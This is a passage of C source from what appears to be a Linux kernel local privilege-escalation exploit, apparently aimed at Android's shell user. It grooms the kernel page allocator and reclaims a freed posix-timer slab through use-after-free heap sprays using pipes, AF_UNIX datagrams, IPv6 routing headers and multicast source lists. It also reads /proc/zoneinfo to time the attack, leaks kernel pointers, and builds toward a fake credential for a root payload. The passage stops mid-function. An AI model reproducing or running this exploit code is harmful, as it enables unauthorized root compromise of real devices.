static int ic_reap_pipe_spray(uint64_t target, struct ic_reap_result *res)
{
	uint64_t pc = 0;
	const char *env = getenv("IC_PC");
	unsigned int i, p;
	unsigned long n = 0;

	if (env)
		pc = strtoull(env, NULL, 0);
	if (!ic_pipes.fds) {
		fprintf(stderr, "[reap] pipe spray not prepared\n");
		return -1;
	}
	ic_reap_write_pattern(ic_pipes.pattern, pc, target);
	for (i = 0; i < ic_pipes.count; i++) {
		for (p = 0; p < ic_pipes.pages; p++) {
			ssize_t r = write(ic_pipes.fds[i][1], ic_pipes.pattern,
					  IC_PAGE);

			if (r != (ssize_t)IC_PAGE)
				break;
			n++;
		}
	}
	ic_pipes.written = n;
	fprintf(stderr, "[reap] pipe pages written=%lu\n", n);
	memset(res, 0, sizeof(*res));
	res->pages = NULL;
	res->npages = 0;
	return n ? 0 : -1;
}

static void ic_pipe_cleanup(void)
{
	unsigned int i;

	if (!ic_pipes.fds)
		return;
	for (i = 0; i < ic_pipes.count; i++) {
		close(ic_pipes.fds[i][0]);
		close(ic_pipes.fds[i][1]);
	}
	free(ic_pipes.fds);
	free(ic_pipes.pattern);
	ic_pipes.fds = NULL;
	ic_pipes.pattern = NULL;
	ic_pipes.count = 0;
}

/*
 * App-legal per-CPU page-list flush.
 *
 * The k_itimer frees are RCU-deferred, and when SLUB discards the empty
 * order-1 slabs the pages are parked on this CPU's
 * pcp[order 1][UNMOVABLE] list.  Order-0 pipe allocations only ever look
 * at pcp order-0 (and refill it from the buddy), so they never see those
 * pages.  free_unref_page_commit() only bulk-drains every pcp list when
 * `free_high` is set, i.e. when an order 1..3 page is freed while
 * pcp->free_factor != 0.  free_factor is bumped at each threshold drain.
 *
 * A queued AF_UNIX datagram larger than KMALLOC_MAX_CACHE_SIZE owns a
 * kmalloc_large order-2 page (UNMOVABLE, non-compound user data).  recv()
 * with a zero-length buffer and MSG_TRUNC discards the datagram and
 * kfree()s that page synchronously in our syscall, so a recv burst is a
 * synchronous order-2 free burst that trips the free_high path and pushes
 * the parked order-1 slab pages into the buddy allocator.
 */
#define IC_SKB_SOCKS 64
#define IC_SKB_MAX 2048
#define IC_SKB_PAYLOAD 15360U
#define IC_SKB_PAYLOAD_MIN 9216U
#define IC_SKB_PAYLOAD_MAX 61440U
#define IC_SKB_SOCKBUF (4 * 1024 * 1024)

struct ic_skb_burst {
	int (*fds)[2];
	unsigned int nsocks;
	unsigned int payload;
	unsigned long queued;
	unsigned long bytes;
};

static struct ic_skb_burst ic_skb;

static int ic_skb_prepare(void)
{
	const char *env;
	unsigned int want = IC_SKB_SOCKS;
	unsigned int payload = IC_SKB_PAYLOAD;
	unsigned int i;
	int bufsz = IC_SKB_SOCKBUF;
	char *msg;

	env = getenv("IC_SKB_SOCKS");
	if (env) {
		want = (unsigned int)strtoul(env, NULL, 0);
		if (!want || want > IC_SKB_MAX)
			want = IC_SKB_SOCKS;
	}
	env = getenv("IC_SKB_PAYLOAD");
	if (env) {
		payload = (unsigned int)strtoul(env, NULL, 0);
		if (payload < IC_SKB_PAYLOAD_MIN ||
		    payload > IC_SKB_PAYLOAD_MAX)
			payload = IC_SKB_PAYLOAD;
		payload &= ~63U;
	}
	msg = malloc(payload);
	ic_skb.fds = calloc(want, sizeof(*ic_skb.fds));
	if (!msg || !ic_skb.fds) {
		free(msg);
		free(ic_skb.fds);
		ic_skb.fds = NULL;
		return -1;
	}
	memset(msg, 0x41, payload);
	for (i = 0; i < want; i++) {
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0,
			       ic_skb.fds[i]))
			break;
		(void)setsockopt(ic_skb.fds[i][0], SOL_SOCKET, SO_SNDBUF,
				 &bufsz, sizeof(bufsz));
		(void)setsockopt(ic_skb.fds[i][1], SOL_SOCKET, SO_RCVBUF,
				 &bufsz, sizeof(bufsz));
	}
	ic_skb.nsocks = i;
	ic_skb.payload = payload;
	for (i = 0; i < ic_skb.nsocks; i++) {
		for (;;) {
			ssize_t r = send(ic_skb.fds[i][0], msg, payload,
					 MSG_DONTWAIT | MSG_NOSIGNAL);

			if (r != (ssize_t)payload)
				break;
			ic_skb.queued++;
			ic_skb.bytes += (unsigned long)payload;
		}
	}
	free(msg);
	fprintf(stderr,
		"[reap] skb queued=%lu socks=%u payload=%u bytes=%lu\n",
		ic_skb.queued, ic_skb.nsocks, ic_skb.payload, ic_skb.bytes);
	return ic_skb.queued ? 0 : -1;
}

static unsigned long ic_skb_flush(void)
{
	unsigned long freed = 0;
	unsigned int i;

	for (i = 0; i < ic_skb.nsocks; i++) {
		for (;;) {
			ssize_t r = recv(ic_skb.fds[i][1], NULL, 0,
					 MSG_TRUNC | MSG_DONTWAIT);

			if (r < 0)
				break;
			freed++;
		}
	}
	fprintf(stderr, "[reap] skb flushed=%lu (queued=%lu)\n", freed,
		ic_skb.queued);
	return freed;
}

/*
 * Free at most `max` datagrams.  One order-2 free is enough to take the
 * free_high path on a primed pcp and bulk-drain every list, so a handful of
 * frees drains the parked order-1 slab without also burying it under a
 * 500 MB order-2 flood (which is what ic_skb_flush() does before the spray).
 */
static unsigned long ic_skb_flush_n(unsigned long max)
{
	unsigned long freed = 0;
	unsigned int i;

	for (i = 0; i < ic_skb.nsocks && freed < max; i++) {
		while (freed < max) {
			ssize_t r = recv(ic_skb.fds[i][1], NULL, 0,
					 MSG_TRUNC | MSG_DONTWAIT);

			if (r < 0)
				break;
			freed++;
		}
	}
	return freed;
}

/*
 * SKB flush that actually drains the parked order-1 slabs.
 *
 * free_unref_page_commit() only takes the free_high path for order>0 frees
 * when pcp->free_factor != 0 on the freeing CPU.  free_factor is bumped by
 * ordinary threshold drains (nr_pcp_free()) and halved by every pcp
 * allocation, so after the pool free's syscalls, stats reads and sleeps it
 * is back at 0 and the order-2 burst only drains its own pindex list.
 * Freeing a burst of order-0 pages immediately before the order-2 burst
 * re-arms free_factor on this CPU; the first order-2 free then bulk-drains
 * every pcp list (including order-1 Unmovable) into the buddy.
 */
static unsigned long ic_skb_flush_primed(void)
{
	int prime = !getenv("IC_SKBF_NOPRIME");

	if (prime)
		(void)ic_prime_pcp();
	return ic_skb_flush();
}

static void ic_skb_cleanup(void)
{
	unsigned int i;

	if (!ic_skb.fds)
		return;
	for (i = 0; i < ic_skb.nsocks; i++) {
		close(ic_skb.fds[i][0]);
		close(ic_skb.fds[i][1]);
	}
	free(ic_skb.fds);
	memset(&ic_skb, 0, sizeof(ic_skb));
}

/*
 * cpu0's pageset counters as the shell domain can see them.
 *
 * /proc/slabinfo is root-only, but /proc/zoneinfo still prints the per-CPU
 * pagesets to uid 2000, so the whole pcp state of the CPU the attempt runs
 * on is observable before the exploit has any privilege.  Only the Normal
 * zone matters: the order-1 slab pages come from there.
 */
static int g_zoneinfo_fd = -1;
static char g_zoneinfo_buf[16384];

/* Opened before anything is on the pageset we care about; see
 * ic_pcp_count0(). */
static void ic_zoneinfo_preopen(void)
{
	if (g_zoneinfo_fd < 0)
		g_zoneinfo_fd = open("/proc/zoneinfo", O_RDONLY);
}

static int ic_pcp_count0(unsigned int *count, unsigned int *high,
			 unsigned int *batch)
{
	char line[256];
	int cpu = -1, in_normal = 0, in_sets = 0, got = 0;
	const char *p, *end;
	ssize_t n;

	/* One pread() on a pre-opened fd.  fopen() here allocates a struct
	 * file, a dentry and a seq_file buffer; both filp (320 B, 25 per
	 * order-1 slab) and dentry (208 B, 39 per order-1 slab) are slab
	 * caches, so an fopen issued while X's discarded page sits at the
	 * head of cpu0's order-1 pageset list can take that page and turn the
	 * attempt into a miss (and, if it lands on the node slot, an oops).
	 * The gate runs at exactly that moment, so it must allocate nothing. */
	if (g_zoneinfo_fd < 0)
		g_zoneinfo_fd = open("/proc/zoneinfo", O_RDONLY);
	if (g_zoneinfo_fd < 0)
		return -1;
	n = pread(g_zoneinfo_fd, g_zoneinfo_buf, sizeof(g_zoneinfo_buf) - 1, 0);
	if (n <= 0)
		return -1;
	g_zoneinfo_buf[n] = 0;
	end = g_zoneinfo_buf + n;
	p = g_zoneinfo_buf;
	while (p < end) {
		const char *z;
		size_t len = 0;

		while (p + len < end && p[len] != '\n')
			len++;
		if (len >= sizeof(line))
			len = sizeof(line) - 1;
		memcpy(line, p, len);
		line[len] = 0;
		p += len;
		while (p < end && *p != '\n')
			p++;
		if (p < end)
			p++;

		if (!strncmp(line, "Node ", 5)) {
			z = strstr(line, "zone");
			in_normal = z && strstr(z, "Normal") ? 1 : 0;
			in_sets = 0;
			cpu = -1;
			continue;
		}
		if (!in_normal)
			continue;
		if (strstr(line, "pagesets")) {
			in_sets = 1;
			continue;
		}
		if (!in_sets)
			continue;
		if (sscanf(line, " cpu: %d", &cpu) == 1) {
			if (cpu == 0)
				got = 0;
			continue;
		}
		if (cpu != 0)
			continue;
		if (sscanf(line, " count: %u", count) == 1) {
			got |= 1;
			continue;
		}
		if (sscanf(line, " high: %u", high) == 1) {
			got |= 2;
			continue;
		}
		if (sscanf(line, " batch: %u", batch) == 1) {
			got |= 4;
			continue;
		}
	}
	return got == 7 ? 0 : -1;
}

/* Log cpu0's pageset; returns the count or -1. */
static long ic_pcp_log(const char *tag)
{
	unsigned int c = 0, h = 0, b = 0;

	if (ic_pcp_count0(&c, &h, &b)) {
		fprintf(stderr, "[pcp] %-11s cpu=%d ?\n", tag, sched_getcpu());
		fflush(stderr);
		return -1;
	}
	fprintf(stderr, "[pcp] %-11s cpu=%d count=%u high=%u batch=%u\n", tag,
		sched_getcpu(), c, h, b);
	fflush(stderr);
	return (long)c;
}

/*
 * Leave cpu0's pageset well below its high-water mark before a free whose
 * pages we cannot afford to lose.
 *
 * free_unref_page_commit() bulk-drains the *entire* pageset -- every order
 * and migratetype list, the order-1 Unmovable list included -- whenever a
 * free of order <= 3 finds count >= high and free_factor != 0.  With a full
 * pageset that is exactly what X's slab discard sees, and X then reaches the
 * buddy behind the ~high pages dumped before it.  run14 is consistent with
 * this and with nothing else: X kept its posix freepointers through the
 * whole spray, so no cache and no spray slab had ever been handed the page.
 *
 * Freeing queued datagrams lowers the count: while the pageset is over the
 * mark every free trips a threshold drain, and once free_factor is raised
 * the drain takes the whole pageset.  The counter is re-read after each
 * burst and the burst grows, so the loop converges whatever order the skb
 * data pages are freed in.  It never frees more than maxdgram datagrams, and
 * it does nothing at all when the pageset is already shallow.
 * Returns the final count, or -1 when the counter cannot be read.
 */
static long ic_pcp_prime_low(unsigned int slack, unsigned long maxdgram)
{
	unsigned int c = 0, h = 0, b = 0;
	unsigned long chunk = 64, freed = 0;
	unsigned int i;

	if (ic_pcp_count0(&c, &h, &b))
		return -1;
	chunk = 64;
	freed = 0;
	fprintf(stderr, "[pcp] prime start count=%u high=%u slack=%u\n", c, h,
		slack);
	if ((long)h - (long)c >= (long)slack)
		return (long)c;
	for (i = 0; i < 8; i++) {
		if (freed >= maxdgram || !ic_skb.queued)
			break;
		if (freed + chunk > maxdgram)
			chunk = maxdgram - freed;
		if (!chunk)
			break;
		freed += ic_skb_flush_n(chunk);
		if (ic_pcp_count0(&c, &h, &b))
			return -1;
		fprintf(stderr,
			"[pcp] prime burst freed=%lu count=%u high=%u\n",
			freed, c, h);
		if ((long)h - (long)c >= (long)slack)
			break;
		chunk <<= 1;
	}
	fprintf(stderr, "[pcp] prime done freed=%lu count=%u high=%u %s\n",
		freed, c, h,
		(long)h - (long)c >= (long)slack ? "low" : "HIGH");
	fflush(stderr);
	return (long)c;
}

/*
 * Gate run right after the slabinfo drop: X's page is the newest order-1
 * free, so it sits at the head of cpu0's order-1 Unmovable list and the
 * spray's first fresh slab pops it -- but only if the insert did not trip
 * the pageset drain.  A drained pageset leaves ~0 pages behind, while the
 * insert itself only adds 2, so a count far below the pre-flush reading (or
 * one already at the high mark) means X went to the buddy instead.
 * Returns 1 when the page cannot be trusted to be in the pageset.
 */
static int ic_pcp_drop_bad(long pre)
{
	unsigned int c = 0, h = 0, b = 0;

	if (ic_pcp_count0(&c, &h, &b))
		return 0;
	fprintf(stderr, "[pcp] post-drop   count=%u high=%u pre=%ld\n", c, h,
		pre);
	if (pre >= 0 && (long)c < pre - 256)
		return 1;
	if ((long)c >= (long)h - 4)
		return 1;
	return 0;
}

/* How far cpu0's pageset sits below its drain trigger.  A free of order <= 3
 * that lands with count >= high and free_factor != 0 empties the whole
 * pageset, so this headroom is what keeps X's insert from draining it.
 * Returns a very negative number when the counter cannot be read. */
static long ic_pcp_headroom(void)
{
	unsigned int c = 0, h = 0, b = 0;

	if (ic_pcp_count0(&c, &h, &b))
		return -0x7fffffffL;
	return (long)h - (long)c;
}

/*
 * IPv6 sticky routing-header spray: kmalloc-512, one object per socket.
 *
 * setsockopt(IPV6_RTHDR, 448 bytes) is the only sticky-option variant that
 * does not require CAP_NET_RAW (ipv6_set_opt_hdr() exempts it explicitly).
 * ipv6_renew_options() then does one sock_kmalloc(GFP_ATOMIC) of
 *   sizeof(struct ipv6_txoptions) + CMSG_ALIGN(ipv6_optlen(hdr))
 *   = 0x40 + 448 = 512,
 * i.e. a kmalloc-512 object (order 1, unmovable), and memcpy()s the
 * 448-byte header verbatim at blob+0x40, so getsockopt(IPV6_RTHDR) reads
 * the whole blob tail back to userspace.  The type-4 branch validates with
 * seg6_validate_srh(..., optlen, false): type 4, ((hdrlen+1)<<3) == optlen
 * (hdrlen 55), segments_left <= first_segment, and the TLV chain starting
 * at offset 0x18 tiling the remaining 424 bytes exactly.  An all-zero
 * buffer satisfies all of it (each zero TLV is 2 bytes, 212 of them).
 *
 * The same zero bytes are the fake rb_node for the stale cpu_timer:
 * parent_color/rb_right/rb_left/expires at node+0/+8/+0x10/+0x18 are zero,
 * which is the safe case-1 rb_erase() from a single-node tree (it clears
 * root->rb_node and root->rb_leftmost stays NULL because rb_next() on a
 * parentless childless node returns NULL).  The SRH-mandated bytes
 * (blob 0x40..0x44 and the TLV length at 0x59) all sit below the smallest
 * possible node offset (r >= 0x78 for a 0x108-byte posix_timers object),
 * so they never overlap the node fields.  The node address itself is
 * written by RB_CLEAR_NODE() at node+0 during the victim reap and is read
 * back here as a kernel pointer V with (V & 0x1ff) == r, r the blob offset
 * of the qword.
 */
#define IC_RTHDR_OPT_LEN 448
#define IC_RTHDR_HDRLEN 55
#define IC_RTHDR_DEFAULT 16384
#define IC_RTHDR_MAX 131072
#define IC_IPPROTO_IPV6 41
#define IC_IPPROTO_NONE 59
#ifndef IPV6_RTHDR
#define IPV6_RTHDR 57
#endif

struct ic_rthdr_spray {
	int *fds;
	unsigned int count;
	unsigned int want;
	unsigned char pat[IC_RTHDR_OPT_LEN];
};

struct ic_rthdr_hit {
	uint64_t value;
	unsigned int sock;
	unsigned int off;	/* blob offset of the qword */
	unsigned int hits;
	unsigned int odd;	/* kernel pointers failing the low-bit test */
};

static struct ic_rthdr_spray ic_rthdr;

static int ic_reap_use_rthdr(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "rthdr");
}

static void ic_rthdr_fill(void)
{
	memset(ic_rthdr.pat, 0, sizeof(ic_rthdr.pat));
	ic_rthdr.pat[0] = IC_IPPROTO_NONE;
	ic_rthdr.pat[1] = IC_RTHDR_HDRLEN;
	ic_rthdr.pat[2] = 4;		/* IPV6_SRCRT_TYPE_4 */
	ic_rthdr.pat[3] = 0;		/* segments_left */
	ic_rthdr.pat[4] = 0;		/* first_segment */
}

static int ic_rthdr_spray(uint64_t target, struct ic_reap_result *res)
{
	const char *env = getenv("IC_RTHDR_SOCKS");
	unsigned int want = IC_RTHDR_DEFAULT;
	unsigned int i;
	struct rlimit rl;
	int last_errno = 0;

	(void)target;
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		want = v > IC_RTHDR_MAX ? IC_RTHDR_MAX : (unsigned int)v;
	}
	if (!want)
		want = IC_RTHDR_DEFAULT;
	/* One fd per blob; raise only the soft limit, and only up to the
	 * hard limit (non-root cannot go further anyway). */
	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		rlim_t need = (rlim_t)want + 128;

		if (rl.rlim_cur < need) {
			struct rlimit nl = rl;

			nl.rlim_cur = rl.rlim_max < need ? rl.rlim_max : need;
			if (nl.rlim_cur != rl.rlim_cur)
				(void)setrlimit(RLIMIT_NOFILE, &nl);
		}
	}
	ic_rthdr.fds = calloc(want, sizeof(*ic_rthdr.fds));
	if (!ic_rthdr.fds)
		return -1;
	ic_rthdr_fill();
	for (i = 0; i < want; i++) {
		int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);

		if (fd < 0) {
			last_errno = errno;
			break;
		}
		/* 448 bytes: exactly one kmalloc-512 blob per socket.  The
		 * default option state is replaced on the very first call,
		 * so no old blob is RCU-freed here. */
		if (setsockopt(fd, IC_IPPROTO_IPV6, IPV6_RTHDR,
			       ic_rthdr.pat, sizeof(ic_rthdr.pat))) {
			last_errno = errno;
			close(fd);
			break;
		}
		ic_rthdr.fds[i] = fd;
	}
	ic_rthdr.count = i;
	ic_rthdr.want = want;
	memset(res, 0, sizeof(*res));
	fprintf(stderr, "[reap] rthdr socks=%u/%u errno=%d\n",
		ic_rthdr.count, want, ic_rthdr.count == want ? 0 : last_errno);
	return ic_rthdr.count ? 0 : -1;
}

static void ic_rthdr_scan(struct ic_rthdr_hit *hit)
{
	unsigned char buf[IC_RTHDR_OPT_LEN];
	unsigned int s, off;

	memset(hit, 0, sizeof(*hit));
	for (s = 0; s < ic_rthdr.count; s++) {
		socklen_t len = sizeof(buf);

		memset(buf, 0, sizeof(buf));
		if (getsockopt(ic_rthdr.fds[s], IC_IPPROTO_IPV6, IPV6_RTHDR,
			       buf, &len))
			continue;
		if (len != IC_RTHDR_OPT_LEN)
			continue;
		/* The node offset inside a 512-byte object is r = node &
		 * 0x1ff; the header copy starts at blob 0x40, so byte o of
		 * the readback is blob offset o + 0x40.  The possible node
		 * offsets of a 0x108-byte posix_timers object are
		 * 0x78 + 8k (mod 0x200) for k < 31, all 8-aligned and
		 * >= 0x78; scan the whole tail anyway so an unexpected
		 * geometry still shows up. */
		for (off = 0x48; off + 8 <= 0x200; off += 8) {
			uint64_t v;

			memcpy(&v, buf + (off - 0x40), 8);
			if (!ic_is_kernel_pointer(v))
				continue;
			if ((v & 0x1ffUL) != (uint64_t)off) {
				hit->odd++;
				if (hit->odd <= 4)
					fprintf(stderr,
						"[rthdr] odd s=%u off=0x%x v=0x%llx\n",
						s, off,
						(unsigned long long)v);
				continue;
			}
			if (!hit->hits) {
				hit->value = v;
				hit->sock = s;
				hit->off = off;
			}
			hit->hits++;
		}
	}
}

static void ic_rthdr_cleanup(void)
{
	unsigned int i;

	if (!ic_rthdr.fds)
		return;
	for (i = 0; i < ic_rthdr.count; i++) {
		if (ic_rthdr.fds[i] >= 0)
			close(ic_rthdr.fds[i]);
	}
	free(ic_rthdr.fds);
	memset(&ic_rthdr, 0, sizeof(ic_rthdr));
}

/* ---------------- IPv6 multicast source list (kmalloc-256) ----------------
 *
 * MCAST_MSFILTER on an AF_INET6 socket whose membership list already holds
 * the group allocates the source list with
 *	sock_kmalloc(sk, struct_size(psl, sl_addr, numsrc), GFP_KERNEL)
 * where struct ip6_sf_socklist is {u32 sl_max; u32 sl_count; rcu_head rcu;
 * struct in6_addr sl_addr[]} (header 0x18) and every entry is 16 bytes of
 * user-chosen data.  numsrc 14 gives 0x18 + 224 = 248 bytes: kmalloc-256,
 * the same order-1 slab cache the freed posix_timers page returns to.
 *
 * The address passed by the sysctl cap is mld_max_msf (64) and the entries
 * are not validated, so the 224-byte payload is free-form.  getsockopt()
 * returns every entry verbatim (as sockaddr_storage, address at +8), which
 * makes the object readable after the RB_CLEAR_NODE() self-write: the node
 * offset inside a 256-byte object is (0x78 + 8k) & 0xff and the write lands
 * in the readable window for every slot except the header and the two
 * slots straddling the object end.
 *
 * MCAST_MSFILTER needs an existing membership, so the sockets are created
 * early (ic_mcast_prepare) and only the join + filter calls run at the
 * reclaim point.  An EXCLUDE filter is used on purpose: ip6_mc_source()
 * only drops the membership when an INCLUDE list is emptied, so with
 * EXCLUDE the object survives leaving down to zero sources and can be
 * edited in place afterwards (block/unblock insert and delete entries).
 */
#define IC_MCAST_NSRC 14
#define IC_MCAST_SLIST_OFF 0x90
#define IC_MCAST_SS 0x80
#define IC_MCAST_GF_SIZE (IC_MCAST_SLIST_OFF + IC_MCAST_NSRC * IC_MCAST_SS)
#define IC_MCAST_FDS_DEFAULT 600
#define IC_MCAST_GROUPS_DEFAULT 64
#define IC_MCAST_FDS_MAX 2048
#define IC_MCAST_GROUPS_MAX 64
#define IC_MCAST_TAIL_DEFAULT 64
#define IC_MCAST_IPV6 41
#define IC_MCAST_JOIN_GROUP 42
#define IC_MCAST_MSFILTER 48
/* uapi/linux/in.h: MCAST_EXCLUDE is 0 and MCAST_INCLUDE is 1.  EXCLUDE is
 * required: BLOCK/UNBLOCK_SOURCE both call ip6_mc_source with omode =
 * MCAST_EXCLUDE and return -EINVAL when pmc->sfmode differs, and an INCLUDE
 * filter that is emptied makes the kernel leave the group
 * (ipv6_sock_mc_drop), which would free the psl we are editing. */
#define IC_MCAST_EXCLUDE 0

struct ic_mcast_ss {
	unsigned short family;
	unsigned char pad[126];
} __attribute__((aligned(8)));

struct ic_mcast_gf {
	uint32_t iface;
	struct ic_mcast_ss group;
	uint32_t fmode;
	uint32_t numsrc;
	struct ic_mcast_ss slist[IC_MCAST_NSRC];
};

struct ic_mcast_greq {
	uint32_t iface;
	struct ic_mcast_ss group;
};

struct ic_mcast_hit {
	uint64_t value;
	unsigned int sock;
	unsigned int group;
	unsigned int off;
	unsigned int hits;
	unsigned int odd;
	unsigned int unsafe;
	unsigned int ordinal;
};

static struct {
	int *fds;
	unsigned int nfd;
	unsigned int groups;
	/* Number of distinct group addresses for the whole spray.  The
	 * interface keeps one mc_list entry per distinct group and every
	 * add/delete walks it, so without sharing a 38k-object spray would
	 * turn each of the 2*14*38k edits into a 38k-entry walk.  With
	 * sharing every socket reuses groups 1..share. */
	unsigned int share;
	unsigned int made;
	unsigned int err;
	int tailfd;
	unsigned int tail;
	unsigned int ifidx;
} ic_mcast;

static int ic_reap_use_mcast(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "mcast");
}

static int ic_mcast_ifindex(void)
{
	char buf[32];
	struct ifreq ifr;
	int fd, n, idx = 1;

	/* SIOCGIFINDEX never touches sysfs, which the shell domain is not
	 * allowed to read under enforcing (each read is an audited denial,
	 * and the audit write itself costs milliseconds on the console).
	 * Any AF_INET6 datagram socket will do; the mcast sockets are legal
	 * in this domain.  The sysfs read stays as a last-resort fallback. */
	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd >= 0) {
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
		n = ioctl(fd, SIOCGIFINDEX, &ifr);
		close(fd);
		if (!n && ifr.ifr_ifindex > 0)
			return ifr.ifr_ifindex;
	}
	fd = open("/sys/class/net/lo/ifindex", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return idx;
	n = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n > 0) {
		buf[n] = 0;
		idx = atoi(buf);
		if (idx <= 0)
			idx = 1;
	}
	return idx;
}

static void ic_mcast_set_group(struct ic_mcast_ss *ss, unsigned int g, int ifidx)
{
	unsigned char *p = (unsigned char *)ss;

	memset(ss, 0, sizeof(*ss));
	p[0] = 10;		/* AF_INET6 */
	p[8] = 0xff;		/* addr[0] */
	p[9] = 0x02;		/* addr[1]: link-local scope */
	p[10] = 0x01;
	p[21] = (unsigned char)(g >> 16);
	p[22] = (unsigned char)(g >> 8);
	p[23] = (unsigned char)g;
	*(uint32_t *)(p + 24) = (uint32_t)ifidx;	/* sin6_scope_id */
}

static void ic_mcast_fill_gf(struct ic_mcast_gf *gf, unsigned int g, int ifidx)
{
	memset(gf, 0, sizeof(*gf));
	gf->iface = (uint32_t)ifidx;
	ic_mcast_set_group(&gf->group, g, ifidx);
	gf->fmode = IC_MCAST_EXCLUDE;
	gf->numsrc = IC_MCAST_NSRC;
	/* sources stay all-zero: the stale node must look like a childless
	 * leaf with a NULL parent, and zero sources are also what the
	 * post-leak edit starts from. */
}

/* create the sockets before the drain so the reclaim point only sees the
 * join + filter allocations. */
static int ic_mcast_prepare(void)
{
	const char *env;
	unsigned int want = IC_MCAST_FDS_DEFAULT;
	unsigned int i;
	struct rlimit rl;

	env = getenv("IC_MCAST_FDS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		want = v > IC_MCAST_FDS_MAX ? IC_MCAST_FDS_MAX : (unsigned int)v;
	}
	if (!want)
		want = IC_MCAST_FDS_DEFAULT;
	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		rlim_t need = (rlim_t)want + 128;

		if (rl.rlim_cur < need) {
			struct rlimit nl = rl;

			nl.rlim_cur = rl.rlim_max < need ? rl.rlim_max : need;
			(void)setrlimit(RLIMIT_NOFILE, &nl);
		}
	}
	ic_mcast.fds = calloc(want, sizeof(*ic_mcast.fds));
	if (!ic_mcast.fds)
		return -1;
	/* No SOCK_CLOEXEC: the payload the winner execs must not close these
	 * sockets, because the psl that backs the fake cred lives on their
	 * socket list. */
	for (i = 0; i < want; i++) {
		int fd = socket(AF_INET6, SOCK_DGRAM, 0);

		if (fd < 0) {
			ic_mcast.err = (unsigned int)errno;
			break;
		}
		ic_mcast.fds[i] = fd;
	}
	ic_mcast.nfd = i;
	ic_mcast.tailfd = socket(AF_INET6, SOCK_DGRAM, 0);
	ic_mcast.ifidx = (unsigned int)ic_mcast_ifindex();
	ic_mcast.tail = IC_MCAST_TAIL_DEFAULT;
	env = getenv("IC_MCAST_TAIL");
	if (env)
		ic_mcast.tail = (unsigned int)strtoul(env, NULL, 0);
	if (ic_mcast.tail > IC_MCAST_GROUPS_MAX)
		ic_mcast.tail = IC_MCAST_GROUPS_MAX;
	fprintf(stderr, "[mcast] socks=%u/%u tailfd=%d errno=%u\n", ic_mcast.nfd,
		want, ic_mcast.tailfd, ic_mcast.err);
	return ic_mcast.nfd ? 0 : -1;
}

static int ic_mcast_spray(uint64_t target, struct ic_reap_result *res)
{
	const char *env;
	unsigned int per = IC_MCAST_GROUPS_DEFAULT;
	unsigned int i, j, g, made = 0;
	int ifidx;

	(void)target;
	env = getenv("IC_MCAST_GROUPS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		per = v > IC_MCAST_GROUPS_MAX ? IC_MCAST_GROUPS_MAX : (unsigned int)v;
	}
	if (!per)
		per = IC_MCAST_GROUPS_DEFAULT;
	if (!ic_mcast.nfd && ic_mcast_prepare())
		return -1;
	ifidx = ic_mcast_ifindex();
	ic_mcast.ifidx = (unsigned int)ifidx;
	ic_mcast.share = per;
	/* Every socket joins the same groups 1..per, so the spray keeps only
	 * `per` entries in idev->mc_list no matter how many sockets exist.  The
	 * ordinal of the psl (its index in the spray order) is
	 * sock_index * per + (group - 1); see ic_mc_lookup(). */
	for (i = 0; i < ic_mcast.nfd; i++) {
		for (j = 0; j < per; j++) {
			struct ic_mcast_gf gf;
			struct ic_mcast_greq req;
			int fd = ic_mcast.fds[i];

			g = 1 + j;
			ic_mcast_fill_gf(&gf, g, ifidx);
			req.iface = gf.iface;
			memcpy(&req.group, &gf.group, sizeof(req.group));
			if (setsockopt(fd, IC_MCAST_IPV6, IC_MCAST_JOIN_GROUP,
				       &req, sizeof(req))) {
				ic_mcast.err = (unsigned int)errno;
				goto done;
			}
			if (setsockopt(fd, IC_MCAST_IPV6, IC_MCAST_MSFILTER,
				       &gf, sizeof(gf))) {
				ic_mcast.err = (unsigned int)errno;
				goto done;
			}
			made++;
			if (!(made & 0xfff)) {
				fprintf(stderr, "[mcast] progress=%u\n", made);
				fflush(stderr);
			}
		}
	}
	/* Tail: keep allocating after the block that may hold X, so a slab that
	 * is still the per-CPU active slab when the main loop ends gets its
	 * remaining freelist slots filled.  A free slot in the node's own
	 * 0x18-byte window would put a hardened freelist pointer into the tree
	 * links and panic B's reap. */
	if (ic_mcast.tail && ic_mcast.tailfd >= 0) {
		for (j = 0; j < ic_mcast.tail; j++) {
			struct ic_mcast_gf gf;
			struct ic_mcast_greq req;

			g = 1 + j;
			ic_mcast_fill_gf(&gf, g, ifidx);
			req.iface = gf.iface;
			memcpy(&req.group, &gf.group, sizeof(req.group));
			if (setsockopt(ic_mcast.tailfd, IC_MCAST_IPV6,
				       IC_MCAST_JOIN_GROUP, &req, sizeof(req))) {
				ic_mcast.err = (unsigned int)errno;
				break;
			}
			if (setsockopt(ic_mcast.tailfd, IC_MCAST_IPV6,
				       IC_MCAST_MSFILTER, &gf, sizeof(gf))) {
				ic_mcast.err = (unsigned int)errno;
				break;
			}
			made++;
		}
	}
done:
	ic_mcast.groups = per;
	ic_mcast.made = made;
	memset(res, 0, sizeof(*res));
	fprintf(stderr, "[mcast] objs=%u socks=%u per=%u errno=%u\n", made,
		ic_mcast.nfd, per, ic_mcast.err);
	return made ? 0 : -1;
}

static void ic_mcast_scan_fd(struct ic_mcast_hit *hit, int fd, unsigned int g,
			     unsigned int count, unsigned int sock)
{
	unsigned char data[IC_MCAST_NSRC * 16];
	/* Cached at prepare/spray time: the per-fd probe here used to read
	 * sysfs once per socket, which under enforcing is a denied, audited
	 * open+read -- 600 of them stall the scan past the attempt window. */
	unsigned int ifidx = ic_mcast.ifidx;
	unsigned int j, k;

	if (!ifidx)
		ifidx = 1;

	for (j = 0; j < count; j++) {
		struct ic_mcast_gf gf;
		socklen_t len = sizeof(gf);

		if (fd < 0)
			continue;
		ic_mcast_fill_gf(&gf, g + j, (int)ifidx);
